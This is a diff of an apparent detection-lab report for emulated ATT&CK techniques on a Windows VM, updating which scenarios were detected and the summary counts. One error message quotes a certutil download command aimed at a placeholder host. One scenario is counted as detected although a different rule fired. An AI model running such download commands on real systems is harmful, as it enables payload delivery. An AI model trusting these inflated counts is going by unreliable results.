@@ -1,6 +1,6 @@
 {
-    "generated_at":  "2026-11-14T10:25:18.3152906Z",
-    "head":  "f0651b0",
+    "generated_at":  "2026-11-14T10:46:06.5472676Z",
+    "head":  "20b3eb6",
     "vm":  "AIDFLAB",
     "scenarios":  [
                       {
@@ -47,8 +47,8 @@
                           "id":  "WIN-05",
                           "technique":  "T1053.005",
                           "expected":  "WIN-SCHTASK-006",
-                          "detected":  false,
-                          "observed":  "",
+                          "detected":  true,
+                          "observed":  "WIN-SCHTASK-006",
                           "run":  true,
                           "holdout":  false,
                           "error":  ""
@@ -57,8 +57,8 @@
                           "id":  "WIN-06",
                           "technique":  "T1547.001",
                           "expected":  "WIN-RUNKEY-005",
-                          "detected":  false,
-                          "observed":  "",
+                          "detected":  true,
+                          "observed":  "WIN-RUNKEY-005",
                           "run":  true,
                           "holdout":  true,
                           "error":  ""
@@ -76,8 +76,8 @@
                           "id":  "WIN-08",
                           "technique":  "T1562.001",
                           "expected":  "WIN-DEFENDER-TAMPER-009",
-                          "detected":  false,
-                          "observed":  "",
+                          "detected":  true,
+                          "observed":  "WIN-RUNKEY-005",
                           "run":  true,
                           "holdout":  true,
                           "error":  ""
@@ -97,7 +97,7 @@
                           "technique":  "T1105",
                           "expected":  "none",
                           "detected":  true,
-                          "observed":  "WIN-SERVICE-CREATE-007",
+                          "observed":  "WIN-INJECT-010",
                           "run":  true,
                           "holdout":  true,
                           "error":  "Program \u0027certutil.exe\u0027 failed to run: Access is deniedAt C:\\AIDefender\\redteam20_vm.ps1:57 char:17\r\n+ ...    action={ \u0026 certutil.exe -urlcache -f \"https://example.com/\" \"C:\\Te ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~."
@@ -153,7 +153,7 @@
                           "technique":  "T1027",
                           "expected":  "WIN-MASQUERADE-011",
                           "detected":  true,
-                          "observed":  "WIN-EXEC-TEMP-001,WIN-MASQUERADE-011",
+                          "observed":  "WIN-MASQUERADE-011,WIN-EXEC-TEMP-001,WIN-SERVICE-CREATE-007",
                           "run":  true,
                           "holdout":  true,
                           "error":  ""
@@ -204,11 +204,11 @@
                     "run":  15,
                     "skipped":  5,
                     "attacks_run":  11,
-                    "attacks_detected":  5,
+                    "attacks_detected":  8,
                     "controls_run":  4,
                     "control_fp":  1,
                     "holdout_total":  5,
-                    "holdout_detected":  2
+                    "holdout_detected":  4
                 },
     "limitations":  "Safe emulation, 20/OS catalog with 5 destructive entries skipped; detection only for this run (prevention measured separately); E1-E6 still require real samples and a hidden holdout."
 }
